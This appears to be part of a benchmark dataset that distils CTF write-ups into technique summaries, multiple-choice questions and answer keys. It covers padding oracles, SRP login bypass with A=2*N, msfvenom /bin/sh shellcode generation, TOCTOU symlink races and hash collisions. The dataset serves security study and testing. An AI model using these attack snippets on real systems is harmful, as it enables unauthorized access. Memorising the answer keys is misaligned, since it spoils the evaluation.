            "When solving a CTF challenge that requires interacting with a network service to manipulate game states or values in real-time, which of the following approaches is most effective? - A. Write a Python script using regular expressions to parse static text files containing potential service responses. - B. Use a telepathy library to predict server responses before establishing a connection. - C. Employ Python's socket programming to dynamically read server responses, calculate necessary inputs, and send these inputs back to achieve a desired outcome. - D. Establish a manual telnet session for each interaction and manually calculate and send responses based on observed patterns."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Day 6_ Udpsanta",
        "write_up": "dataset/raw/Day 6_ Udpsanta.md",
        "type": "crypto",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "When facing encrypted messages over a network protocol lacking message authentication (MAC, HMAC, etc.) and employing predictable error messages or responses, consider exploiting a padding oracle attack. This type of attack can be particularly effective if the encryption mode is CBC, and no message authentication is implemented. It allows for iterative guessing of one byte at a time by observing the presence or absence of error messages in response to modified ciphertexts.",
            "When a service's cryptographic implementation does not include appropriate randomness (e.g., a fixed IV) or relies on predictable error messages, it may be vulnerable to decryption without needing the encryption key. This vulnerability can be exploited by manipulating ciphertexts and observing the changes in error messages or application behavior to infer plaintext data. A common approach to leverage this vulnerability includes:\n   - Determining the encryption IV by exploiting predictable responses or error messages.\n   - Systematically manipulating ciphertext blocks and monitoring responses to deduce plaintext one byte at a time.\n   - Exploiting the lack of message authentication to inject or modify messages within the encrypted communication."
        ],
        "question": [
            "When conducting a padding oracle attack on a service using AES in CBC mode without proper message authentication, which of the following qualities is likely to make the protocol vulnerable?  - A. The presence of a message authentication code (MAC) in every message - B. Using a fixed initial vector (IV) for every message - C. Encryption with a high entropy, unpredictable IV for every message - D. Employing unpredictable error messages for all decryption errors ",
            "In the context of exploiting a service that emits different responses based on the padding validity of a cipher block, which approach is most effective for decrypting messages without the encryption key?  - A. Observing error messages in response to modified ciphertexts to infer plaintext data - B. Encrypting arbitrary plaintext with the service's public key to observe the ciphertext structure - C. Guessing the encryption key by brute force until the correct decryption is found - D. Using a constant IV for encryption and decryption to ensure message consistency "
        ],
        "answer": [
            "B. Using a fixed initial vector (IV) for every message",
            "A. Observing error messages in response to modified ciphertexts to infer plaintext data"
        ]
    },
    {
        "name": "Day 7_ Homebrew",
        "write_up": "dataset/raw/Day 7_ Homebrew.md",
        "type": "crypto",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "When interacting with a web service that uses the Secure Remote Password (SRP) protocol, one can bypass authentication by sending specific values (such as `0`, `N`, `2*N`, etc.) as the `A` value during the login process. This method exploits the protocol by ensuring that the server mathematically reduces the challenge to something that can be easily solved or bypassed, allowing unauthorized access without needing the correct credentials. Specifically, for SRP, submitting `A=0` or a multiple of `N` leads to the server calculating a session key (`S`) that is predictable and typically zero or another value known to the attacker, facilitating the login without the correct password. This approach highlights the importance of validating all client-provided parameters in cryptographic protocols to prevent such bypasses. Example payload: For SRP protocol, use `{'I':'admin','A':2*N}` in the login step1 request, where `N` is the modulus parameter from the SRP setup.",
            "Utilizing HTTP OPTIONS requests can reveal hidden or undocumented API endpoints in web applications that could lead to uncovering vulnerabilities or additional functionality not directly accessible through the web interface. This is particularly useful in CTF challenges and real-world applications where discovering hidden endpoints can disclose intended methods for interaction with the application, or expose endpoints that were not designed to withstand direct attack. Regularly using OPTIONS requests as part of a web application assessment can uncover paths like `/signup/step1`, `/login/step1`, and `/login/step2` as demonstrated, which may provide further opportunities for exploitation or unauthorized access. This emphasizes the necessity of a thorough application mapping phase during penetration testing to ensure all features and potential vulnerabilities are discovered. Example payload: Craft an OPTIONS request like `OPTIONS /signup` to retrieve available methods and additional hidden endpoints."
        ],
        "question": [
            "In a scenario where the Secure Remote Password (SRP) protocol is implemented to authenticate users, which of the following values for `A` could potentially allow an attacker to bypass authentication without knowing the user\u2019s password? - A. Submitting `A=1+g`, where `g` is a group generator. - B. Submitting `A=g^b mod N`, where `b` is a random number and `N` is a prime modulus. - C. Submitting `A=2*N`, where `N` is the modulus parameter from the SRP setup. - D. Submitting `A=B^2`, where `B` is the server's public value. ",
            "When performing an assessment of a web application, a penetration tester decides to use specific HTTP requests to uncover additional functionality. Which type of request would be effective in finding hidden or undocumented API endpoints? - A. Sending a `TRACE` request to each endpoint to trace the path of the request. - B. Sending a `CONNECT` request to establish a tunnel to the server. - C. Sending an `OPTIONS` request to identify additional hidden or undocumented endpoints. - D. Sending a `PATCH` request to update existing resources and discover new endpoints. "
        ],
        "answer": [
            "C. Submitting `A=2*N`, where `N` is the modulus parameter from the SRP setup.",
            "C. Sending an `OPTIONS` request to identify additional hidden or undocumented endpoints."
        ]
    },
    {
        "name": "Day 9_ Tiny",
        "write_up": "dataset/raw/Day 9_ Tiny.md",
        "type": "misc",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "In a challenge involving decoding \"DNA sequences\" into executable formats or readable content, each nucleotide (A, C, T, G) can correspond to binary representations. Mapping these to 0-3 respectively allows for conversion into byte code. This process might require trying multiple mappings due to the ambiguity in how nucleotides are translated to binary. A practical approach would be to attempt all 24 permutations derived from the four nucleotides and examine which results in a valid or recognizable format.",
            "In challenges where specific byte patterns (e.g., `CD 80` or `0F 34`) are disallowed within a payload for execution, utilizing encoding tools like `msfvenom` enables the generation of shellcode that avoids these restricted sequences. By specifying bad characters with the `-b` option, `msfvenom` can create payloads that circumvent the restrictions imposed by the program or challenge environment. A sample usage is `msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\\x0f\\x80' --smallest`, targeting Linux x86 architecture to execute `/bin/sh` without the specified bad characters."
        ],
        "question": [
            "When decoding a sequence of CGGGCACCCAGACACTAAACAAACAAAC with the objective of converting it into executable code or readable content, how would you map the nucleotides A, C, T, G to binary to begin this process? - A. Map A, C, T, G to 3, 2, 1, 0 respectively and test all possible permutations. - B. Assign sequential prime numbers to A, C, T, G and perform modulo arithmetic to find binary equivalents. - C. **Map A, C, T, G to 0, 1, 2, 3 respectively and systematically test all 24 permutations that could result from these nucleotides.** - D. Use the alphabetical order of A, C, T, G to assign binary values, then adjust based on the ASCII values of each character. ",
            "In a challenge where the execution of a payload is conditional on avoiding the byte patterns `CD 80` and `0F 34`, which tool and method can efficiently generate a compliant shellcode? - A. Use `gcc` to compile a C program into an executable while excluding specific hex patterns. - B. **Utilize `msfvenom` with the `-b` option to specify bad characters and generate shellcode that circumvents the byte pattern restrictions.** - C. Manually encode the payload in Base64 to avoid any direct representation of the restricted byte patterns. - D. Apply a simple XOR cipher to an existing shellcode, ensuring that the `CD 80` and `0F 34` patterns are masked. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "decompile me",
        "write_up": "dataset/raw/decompile me.md",
        "type": "The type of CTF challenge described in the write-up is a reverse challenge.",
        "competition": [
            "zer0pts/2023",
            "https://ctftime.org/event/1972/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In reverse engineering challenges dealing with encryption, particularly with the RC4 algorithm, it's paramount to examine the initialization and encryption routines closely for deviations from standard implementations. This can involve inspecting the setup of key and s-box arrays, as reverse-engineered code might not explicitly show the use of certain registers (e.g., `r13` for the s-box and `r12` for the key) that are essential for the encryption process. A custom calling convention or a closer inspection of assembly might reveal the actual parameters being used, which are critical for correctly decrypting the data.",
            "When encountering a function that appears to be a standard library call in reverse-engineered code (e.g., `memcmp`), it's crucial to inspect its functionality in detail. The implementation might differ significantly from the standard one, performing operations that are unexpected, such as XOR-based comparison or validation checks that don't just compare but also manipulate data. This can be a critical point for understanding how data is being processed or validated, revealing hidden conditions or processes essential for solving the challenge."
        ],
        "question": [
            "When reverse-engineering an x86 ELF binary that involves the RC4 encryption algorithm, you notice that the standard calling convention does not seem to be followed for the `RC4_setkey` function. The decompiled code shows no explicit parameters being used, but further inspection reveals registers `r13` and `r12` are in use. In this context, what would be the correct approach to accurately determine the parameters passed to `RC4_setkey`? - A. Ignore the registers and focus on the variables declared in the higher-level decompiled code. - B. Use a custom calling convention to specify `r13` and `r12` as parameters for the function during decompilation. - C. Debug the binary in real-time, altering the values of `r13` and `r12` to see the change in execution. - D. Assume `r13` and `r12` are residual and have no impact on the decryption process. ",
            "In the process of reverse-engineering a binary for a CTF challenge, you encounter a function that is named `memcmp`, which traditionally should perform a byte-by-byte comparison between two memory spaces. However, upon closer inspection, the function's operation includes an XOR between the bytes of the two inputs before comparing. This unexpected implementation suggests it is not the standard `memcmp`. In this scenario, what is the critical realization about handling seemingly standard functions in reverse-engineered code? - A. Standard library function names in decompiled output are always reliable indicators of their original implementation. - B. Decompilers can automatically correct the implementation of standard functions based on their names. - C. It is important to verify the functionality of functions, especially when their names suggest standard library calls, as their actual implementation may perform unexpected operations. - D. Reverse-engineering tools are infallible and always accurately represent the binary's original source code. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Decrypt Vulnerable Data #1",
        "write_up": "dataset/raw/Decrypt Vulnerable Data #1.md",
        "type": "crypto",
        "competition": [
            "HackersPlayground/2020",
            "https://ctftime.org/event/1107/tasks/"
        ],
        "score": 177,
        "max_score": 500,
        "difficulty": 0.354,
        "knowledge": [
            "When facing an LFSR-based encryption scheme in a CTF challenge, a known plaintext attack (KPA) can be executed if a portion of the plaintext is known. This method involves bruteforcing a segment of the secret (such as the LFSR salt) by repeatedly generating output bits from the LFSR with various salt values. By XORing these output bits with both the known plaintext and the corresponding ciphertext bits, it's possible to reconstruct other parts of the LFSR's state or output, thus facilitating the decryption of the remaining ciphertext.",
            "If an encryption algorithm uses multiple Linear Feedback Shift Registers (LFSRs) with different lengths and initialization methods, and part of the ciphertext aligns with a known plaintext, the setup allows for the reverse engineering of LFSR states. Specifically, by determining the initial state of one LFSR (via known plaintext and bruteforce), one can compute the output of another LFSR at a specific state by XORing known plaintext bits, known ciphertext bits, and the output bits from the first LFSR. This method can effectively decrypt the message or further reveal the internal state of the LFSRs for continued decryption without needing to crack the full key directly.\n\nExample of bruteforcing the first LFSR's salt and reconstructing the second LFSR's state:\n```\nfor salt1 in range(1 << 16):  \n    lfsr17 = LFSR(17, salt1, True)  \n    reg2_initial_state = find_reg2(lfsr17)  \n    lfsr25 = LFSR(25, 0, False, reg2_initial_state)  \n    # Followed by the decryption logic...\n```"
        ],
        "question": [
            "In the context of LFSR-based encryption, assuming you are conducting a known plaintext attack (KPA) where the plaintext begins with a known sequence. Which of the following strategies is essential for the successful application of KPA? - A. Utilize the known sequence to directly calculate the LFSR's taps positions. - B. XOR the known plaintext with the ciphertext to directly derive the LFSR's initial state. - C. Bruteforce a component of the LFSR's initialization parameters, like the salt, by generating output bits for comparison with both the known plaintext and corresponding ciphertext bits. - D. Modify the LFSR algorithm to prevent it from discarding the least significant bit (LSB) during the shift operations.",
            "In a scenario where an encryption algorithm leverages two Linear Feedback Shift Registers (LFSRs) of different sizes, with one being initialized with known plaintext-ciphertext alignment, which method would be most effective for reversing the unknown LFSR's state? - A. Applying a differential cryptanalysis to observe discrepancies between LFSR outputs and adjusting the state accordingly. - B. Disassembling the encryption binary to statically analyze the state transition function of each LFSR. - C. Computing the initial state of the unknown LFSR by XORing output bits from the known LFSR with corresponding bits from both known plaintext and ciphertext segments. - D. Seeking patterns in the ciphertext to guess the unknown LFSR's tap positions, assuming all LFSRs share common configurations."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "defcamp6",
        "write_up": "dataset/raw/defcamp6.md",
        "type": "web",
        "competition": [
            "Defcamp/2023/Quals",
            "https://ctftime.org/event/2106/tasks/"
        ],
        "score": 320,
        "max_score": 347,
        "difficulty": 0.9221902017291066,
        "knowledge": [
            "For challenges combining OSINT and Steganography, when provided with an image, it's invaluable to employ tools like the WayBack Machine to find original versions of the image. This comparison can lead to the identification of subtle manipulations used to hide information within the image.",
            "When comparing the original and modified images and finding differences in the pixel values (RGB channels), it might indicate that data is encoded via the subtraction of these values. A simple script can then be employed to iterate over the pixels, subtracting the values of corresponding channels to extract ASCII characters which could compose the flag. Conditions for effective use include having both the original and altered image and knowing the encoding technique relies on the subtraction of pixel values. Example code snippet: \n```python\nfrom PIL import Image\n\n# Open the original and the modified image\noriginal_image = Image.open('original_image_path.jpg')\nmodified_image = Image.open('modified_image_path.jpg')\n\noriginal_pixels = list(original_image.getdata())\nmodified_pixels = list(modified_image.getdata())\n\n# Extract hidden data through pixel value subtraction\nhidden_data = \"\"\nfor original_pixel, modified_pixel in zip(original_pixels, modified_pixels):\n    hidden_data += chr(abs(original_pixel[0] - modified_pixel[0]))\n\nprint(hidden_data)\n```"
        ],
        "question": [
            "When attempting to uncover hidden data within an image for challenges that incorporate OSINT and steganography techniques, which of the following approaches is most likely to be effective? - A. Utilizing a text editor to directly read the image file's binary data. - B. Employing image comparison tools such as the WayBack Machine to find original versions of the image and detecting subtle manipulations. - C. Analyzing the image's metadata for encrypted messages. - D. Decompiling the image file to search for embedded code segments.",
            "In a steganography challenge where the flag is hidden through pixel value manipulation between an original and a modified image, which Python code snippet correctly extracts ASCII characters encoded via the subtraction of RGB channel values of corresponding pixels? - A. ```python for i in range(len(modified_pixels)): print(chr(modified_pixels[i][0] + original_pixels[i][0]), end='') ``` - B. ```python for i in range(len(original_pixels)): hidden_data += chr(original_pixels[i][0] * modified_pixels[i][0]) ``` - C. ```python for original_pixel, modified_pixel in zip(original_pixels, modified_pixels): hidden_data += chr(abs(original_pixel[0] - modified_pixel[0])) ``` - D. ```python for i in range(len(original_pixels)): hidden_data += chr((original_pixels[i][0] ^ modified_pixels[i][0]) % 256) ```"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Delegate wallet",
        "write_up": "dataset/raw/Delegate wallet.md",
        "type": "crypto",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 465,
        "max_score": 1000,
        "difficulty": 0.465,
        "knowledge": [
            "When dealing with challenges involving Linear Congruential Generator (LCG) based pseudo-random number generators, if parameters like `n` are constant and known, it is possible to predict future outputs by obtaining at least three consecutive outputs. This is due to the deterministic nature of LCGs where knowing the modulus (`n`), multiplier (`m`), and increment (`c`) allows for the entire sequence of numbers to be predicted. The method involves solving for `m` and `c` using consecutive output values (`s1`, `s2`, `s3`) and the modulus (`n`):\n   - To solve for `m`: `m = (s3 - s2) * (s2 - s1)^-1 mod n`\n   - To solve for `c`: `c = (s2 - m*s1) mod n`",
            "The application of modular inverse in calculating the multiplier (`m`) for the LCG reveals that knowing just a few outputs in sequence allows us to break the generator and predict future outputs. Tools like `gmpy2` can be used efficiently to compute the modular inverse (`(s2 - s1)^-1 mod n`). This technique only requires basic arithmetic operations and modular inverses, making it widely applicable in scenarios where the internal state or parameters (other than the modulus) of an LCG are not initially known but can be inferred from observed outputs:\n   - Sample code snippet to calculate `m` and `c`:\n     ```python\n     n = pow(2, 607) - 1\n     m = ((s3 - s2) * gmpy2.invert(s2 - s1, n)) % n\n     c = (s2 - m * s1) % n\n     ```\n\nThese points highlight fundamental weaknesses in LCGs when used for cryptographic purposes, emphasizing the importance of choosing secure pseudo-random number generators in cryptographic applications."
        ],
        "question": [
            "In a capture-the-flag challenge focusing on predicting the outputs of a Linear Congruential Generator (LCG) used for generating pseudo-random wallet seeds. Knowing the modulus `n = 2^607 - 1`, and given three consecutive seeds `s1`, `s2`, and `s3`, how can you calculate the multiplier `m` for predicting future seeds? - A. `m = (s3 + s2) * (s2 + s1)^-1 mod n` - B. `m = (s3 - s2) * (s2 - s1) mod n` - C. `m = (s3 - s2) * (s2 - s1)^-1 mod n` - D. `m = (s3 / s2) * (s2 / s1)^-1 mod n` ",
            "In the same context of a cryptography challenge, when attempting to compute the parameters of an LCG's next output, which Python library and method could be correctly used to compute the modular inverse necessary for determining the LCG's multiplier `m`, given `s1`, `s2`, and the modulus `n = 2^607 - 1`? - A. `numpy.invert(s2 - s1, n)` - B. `gmpy2.invert(s2 - s1, n)` - C. `math.invert(s2 - s1, n)` - D. `sympy.invert(s2 - s1, n)` "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "DevMaster 8000",
        "write_up": "dataset/raw/DevMaster 8000.md",
        "type": "pwn",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": 136,
        "max_score": 500,
        "difficulty": 0.272,
        "knowledge": [
            "In challenges featuring a sandbox environment that allows file manipulation and execution of commands, a TOCTOU (Time of Check to Time of Use) vulnerability can be exploited through symlink attacks if checks on file paths are performed before file access. If the environment supports atomic operations like `renameat2` with `RENAME_EXCHANGE`, it can enhance the efficiency and success rate of the attack by minimizing the window where the file is unavailable, thus reducing the risk of service disruption. This can be useful in scenarios where the service performs checks to ensure files are within a certain directory and does not allow symlinks to bypass these checks.\n    - Example payload to repeatedly swap a regular file with a symlink, using atomic replace to prevent service crash:\n    ```c\n    syscall(__NR_renameat2, AT_FDCWD, \"f1\", AT_FDCWD, \"f2\", RENAME_EXCHANGE);\n    ```",
            "In challenges that allow asynchronous operations, exploiting race conditions can be an effective approach. If a service allows fetching files while other operations (e.g., file manipulation) are in progress, one could leverage the timing difference between check and use phases to manipulate the outcome. For instance, if a fetch operation does not impersonate a sandbox user and merely checks if the requested file path resolves within the allowed directory, introducing a race condition by altering the target (e.g., swapping a file with a symlink to a restricted file) between these checks can lead to unauthorized access. The strategy involves creating a condition where during the check, the file appears as a regular file, but by the time of access, it is a symlink to the desired restricted file, exploiting the TOCTOU vulnerability.\n    - Example approach to trigger race condition:\n    ```python\n    for _ in xrange(1000):\n        send_fetch(p, 0, \"f1\")\n        time.sleep(0.1)\n    ```"
        ],
        "question": [
            "In the scenario of leveraging a TOCTOU vulnerability through symlink attacks in a sandboxed environment, which Linux syscall is recommended for atomically swapping a regular file with a symlink to efficiently exploit the vulnerability without crashing the service? - A. `syscall(__NR_rename, \"f1\", \"f2\");` - B. `syscall(__NR_link, \"f1\", \"f2\");` - C. `syscall(__NR_renameat2, AT_FDCWD, \"f1\", AT_FDCWD, \"f2\", RENAME_NOREPLACE);` - D. `syscall(__NR_renameat2, AT_FDCWD, \"f1\", AT_FDCWD, \"f2\", RENAME_EXCHANGE);`",
            "When exploiting a race condition in a scenario where a service performs file operations asynchronously, which approach best describes a method to trigger a race condition that could potentially bypass file access restrictions based on timing differences between a check and use phase? - A. Repeatedly sending a `chmod` command to change permissions and attempting to fetch a protected file. - B. For a given number of attempts, continuously sending a fetch request for a file immediately followed by a short delay. - C. Sending a single fetch request for a symlinked file, assuming the service will not resolve the symlink in time. - D. Creating multiple threads to send parallel build commands in hopes of causing a service crash due to overload."
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "DevMaster 8001",
        "write_up": "dataset/raw/DevMaster 8001.md",
        "type": "pwn",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": 326,
        "max_score": 500,
        "difficulty": 0.652,
        "knowledge": [
            "TOCTOU (Time of Check to Time of Use) vulnerabilities can be exploited in asynchronous systems, particularly in environments where file state can change between validation and use. This is observed in systems that check files' locations or symbolic link (symlink) resolution prior to file operation execution, without locking the state of the filesystem. This creates an opportunity to alter the filesystem state between the check and the use phases, leading to unauthorized file access. An effective strategy to exploit such vulnerabilities involves creating a race condition where a legitimate file is checked but is swapped with a symlink to a restricted file just before access, thus bypassing security checks. \n\n    Example payload strategy:\n    ```c\n    syscall(__NR_renameat2, AT_FDCWD, \"file1\", AT_FDCWD, \"file2\", RENAME_EXCHANGE);\n    ```\n    This syscall command is executed in a loop to continuously swap a regular file with a symlink, attempting to win the race condition.",
            "When exploiting sandbox environments, especially those utilizing Linux's capabilities and restrictions, it is beneficial to understand and exploit the underlying mechanics\u2014such as the use of System V semaphores for sandbox user control. This knowledge can aid in finding indirect ways to elevate privileges or access restricted information. In the context provided, the semaphore mechanism and the admin panel binary's behavior of rebuilding itself present potential, albeit challenging, vectors for exploitation. Knowledge of these mechanisms can guide the development of an exploit by focusing on timing attacks or race conditions that leverage the window between the semaphore being released and the admin panel binary being fetched."
        ],
        "question": [
            "In a cybersecurity challenge involving exploitation of a TOCTOU vulnerability in an asynchronous file handling system, which syscall command would be most effective for creating a race condition by swapping a regular file with a symlink to a sensitive file? - A. `syscall(__NR_create, \"file1\", \"file2\", SYMLINK_CREATION);` - B. `syscall(__NR_link, \"file1\", \"file2\", HARDLINK_CREATE);` - C. `syscall(__NR_rename, \"file1\", \"file2\", STANDARD_RENAME);` - D. `syscall(__NR_renameat2, AT_FDCWD, \"file1\", AT_FDCWD, \"file2\", RENAME_EXCHANGE);`",
            "When attempting to exploit sandbox environments controlled by System V semaphores, which of the following techniques might an attacker use based on an understanding of semaphore behavior and the challenge's asynchronous nature? - A. Directly modifying the semaphore value to immediately grant admin privileges. - B. Exploiting the window between semaphore release and admin panel binary fetching to intercept or replace binary artifacts. - C. Injecting malicious code into the semaphore handling routine to bypass user restrictions permanently. - D. Overloading the semaphore mechanism to cause a denial of service, preventing legitimate semaphore operations."
        ],
        "answer": [
            "D.",
            "B."
        ]
    },
    {
        "name": "dhke_intro",
        "write_up": "dataset/raw/dhke_intro.md",
        "type": "crypto",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When decrypting ciphertext secured by Diffie-Hellman key exchange with small prime numbers, an exhaustive search (brute force) method can be applied effectively. By iterating over all possible combinations of chosen primes and corresponding secret integers within the given prime range, one can generate and test each possible key until the correct key is found. This method capitalizes on the vulnerability posed by the small size of the prime numbers, allowing a feasible search space for potential keys. This approach necessitates converting each trial key into the proper format and size for the encryption algorithm used, such as AES.",
            "For encryption mechanisms that require a fixed-size key, such as AES which needs a 128-bit key, padding the generated key to meet the required length can introduce a deterministic pattern that simplifies the decryption process under certain conditions. If the padding process is known and constant, as in the case of adding a known string to the beginning or end of the key until it reaches the required length, this knowledge can be exploited in decryption attempts to reverse-engineer the key or reduce the complexity of brute-force attacks. This method is particularly effective when the algorithm and padding process are known, highlighting the importance of using secure key generation and padding practices in cryptography."
        ],
        "question": [
            "In a scenario where a small prime number is used in a Diffie-Hellman key exchange to encrypt a message using AES, how would you effectively decrypt the ciphertext if the prime numbers and the encryption method are known? - A. Use a genetic algorithm to predict the key based on ciphertext patterns. - B. Apply an exhaustive search method by iterating over all possible keys generated from the small prime numbers. - C. Decrypt the message using the public key only. - D. Utilize a quantum computer to perform the decryption.",
            "When dealing with encryption that requires a fixed-size key, such as AES with a 128-bit key, and knowing that the key has been padded to meet this requirement using a known constant string, what approach simplifies decrypting the ciphertext? - A. Ignoring the padding and focusing on the length of the ciphertext only. - B. Using the padding pattern to reduce the possibilities of the original key. - C. Applying a differential cryptanalysis to exploit the encryption algorithm vulnerabilities. - D. Encrypting a known plaintext with the same key to compare the outcomes."
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "Diffecient",
        "write_up": "dataset/raw/Diffecient.md",
        "type": "crypto",
        "competition": [
            "SekaiCTF/2022",
            "https://ctftime.org/event/1923/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing a cryptographic challenge involving hashing functions, utilizing the concept of hash collisions can be critical. In scenarios where a vulnerability or weakness in the hashing algorithm (such as MurmurHash3) is known, searching for documented vulnerabilities or examples of hash collisions by cryptographers can provide a significant shortcut to finding a solution. This approach requires less effort than conducting original cryptanalysis or generating collisions from scratch.",
            "In challenges involving hash collisions where the input has specific length or content constraints (e.g., a minimum length or inclusion of certain character types), combining known hash collision pairs and extending their length (if the hashing algorithm is susceptible to length extension or maintains collision properties across varied input lengths) can effectively bypass these constraints. This strategy is based on understanding the properties of the hash function in use and leveraging existing cryptographic research.\n\nSample payload:\n- Original 16-byte collision inputs: 'bdd0c04b5c3995827482773b12acab35' and '652fa0565c3946be7482773b12acab35'\n- Extended to 32 bytes by duplication, successfully passed the admin key checks: 'bdd0c04b5c3995827482773b12acab35bdd0c04b5c3995827482773b12acab35' and '652fa0565c3946be7482773b12acab35652fa0565c3946be7482773b12acab35'"
        ],
        "question": [
            "In the context of dealing with cryptographic challenges that involve hashing functions like MurmurHash3, what strategy can significantly accelerate finding a solution when a hashing algorithm's vulnerability is known? - A. Generate new hash collisions from scratch using custom scripts. - B. Leverage documented vulnerabilities or examples of hash collisions identified by cryptographers. - C. Directly contact the creators of the hashing function for insights. - D. Randomly test inputs until a collision is found.",
            "When faced with a hashing challenge that imposes specific input constraints, such as a minimum length or required character types, and knowing the hash function might be susceptible to length extension or maintains collision properties across varied input lengths, what is an effective strategy to bypass these constraints? - A. Increment input length randomly until the system accepts the value. - B. Encrypt the original input to satisfy the minimum length requirement. - C. Utilize brute force methods to generate inputs that meet all constraints. - D. Combine known hash collision pairs and extend their length to meet input constraints."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Dive in to Numbers",
        "write_up": "dataset/raw/Dive in to Numbers.md",
        "type": "The type of challenge in this write-up is **crypto**.",
        "competition": [
            "S4CTF/2021",
            "https://ctftime.org/event/1329/tasks/"
        ],
        "score": 477,
        "max_score": 500,
        "difficulty": 0.954,
        "knowledge": [
            "When reversing binary challenges involving encoding or encryption schemes, converting strings to integers for manipulation using libraries such as GMP (GNU Multiple Precision Arithmetic Library) is a common technique. Specifically, when an hexadecimal string is converted to a big integer before applying the cryptographic operations, reversing involves understanding the conversion process to correctly interpret the original data and apply reverse operations. Example technique: Convert hexadecimal string `a3d5` to a big integer, perform operations, then convert back to understand original data manipulation.",
            "In challenges that involve encryption schemes with mathematical operations causing lossy conversions or approximations, it's possible to deduce the original inputs by setting up equations based on the encryption logic provided in the challenge. This often requires understanding the mathematical basis of the encryption or encoding scheme to formulate equations that represent the operation. In scenarios where precision loss occurs due to the operations, a brute force approach can be used to fine-tune the results to recover the original data or inputs. Example technique: Suppose an encryption scheme outputs `a1` and `a2` as encrypted values for inputs `x` and `y` with operations suggesting `(x + 2y) / 3 = a1` and `(y + 2*2x) / 3 = a2`. Solving these equations gives `x = 3*(2*a2-a1)/7` and `y = 3*(4*a1-a2)/7`. A brute force method might be required to adjust for any loss in precision to retrieve the exact original inputs `x` and `y`."
        ],
        "question": [
            "When analyzing a binary in a CTF challenge that reads a plaintext file, converts it into a hexadecimal string, and then uses the GNU Multiple Precision Arithmetic Library (GMP) to convert this hexadecimal string to a big integer, which function is correctly used to convert the hexadecimal string to a big integer in GMP?  - A. `mpz_import(mpz_hex_str, inp_data, 1, sizeof(char), 0, 0, NULL);` - B. `mpz_set_str(mpz_hex_str, inp_data, 16);` - C. `mpz_init_set_ui(mpz_hex_str, strtol(inp_data, NULL, 16));` - D. `mpz_set_ui(mpz_hex_str, strtoul(inp_data, NULL, 16));` ",
            "In the context of reversing an encryption scheme where the original mathematical operation applied is `(x + 2y) / 3 = a1` and `(y + 2*2x) / 3 = a2`, and it's indicated that precision loss could occur, which equation correctly represents the process of deducing the original inputs `x` and `y` from the encrypted values `a1` and `a2`?  - A. `x = (a1 + 2 * a2) / 3; y = (2 * a1 + a2) / 3;` - B. `x = 3*(2*a1 - a2) / 7; y = 3*(a1 - 2*a2) / 7;` - C. `x = 3*(2*a2 - a1) / 7; y = 3*(4*a1 - a2) / 7;` - D. `x = (a1 - 2*a2) * 3; y = (2*a1 - a2) * 3;` "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "dividing_secrets",
        "write_up": "dataset/raw/dividing_secrets.md",
        "type": "crypto",
        "competition": [
            "corCTF/2021",
            "https://ctftime.org/event/1364/tasks/"
        ],
        "score": 434,
        "max_score": 500,
        "difficulty": 0.868,
        "knowledge": [
            "When solving cryptographic challenges involving exponentiation under a prime modulus, if direct inversion of operations or solving for the exponent is computationally infeasible (like in the Discrete Logarithm Problem), consider exploiting provided server functionality to manipulate the exponent in a manner that simplifies brute-forcing. For example, dividing the exponent by a significant factor can reduce the problem to a smaller, more manageable search space.",
            "In challenges allowing controlled manipulation of an encrypted secret's exponent, leverage bit-shifting techniques to isolate and solve for small portions of the secret one segment at a time. Specifically, divide the exponent to shift it right by a set number of bits (ideally matching the secret's segmentation), then brute-force the now-topmost segment of the secret before proceeding to further segments. This method effectively reduces the complexity of brute-forcing the entire secret at once, by tackling it in smaller, more manageable chunks. \n\nExample payload snippet in Python: \n```python\nposition = 504  # Starting bit position to isolate top 8 bits of the secret\ntop_bits = 0  # Accumulator for the known top bits of the secret\n\nwhile position >= 0:  \n    r.recvuntil(\"number> \")  \n    r.sendline(str(2**position))  # Divide the exponent to shift secret to the right\n    h = int(r.recvline().decode())  # Get the server's response for the divided secret\n    for i in range(256):  # Brute-force guess for the current 8 bits of the secret\n        if pow(g, (top_bits << 8) | i, p) == h:  # If guess is correct\n            sys.stdout.write(chr(i))  # Output the discovered character\n            top_bits = (top_bits << 8) | i  # Update the known top bits of the secret\n            position -= 8  # Move to the next 8 bits\n            break\n```"
        ],
        "question": [
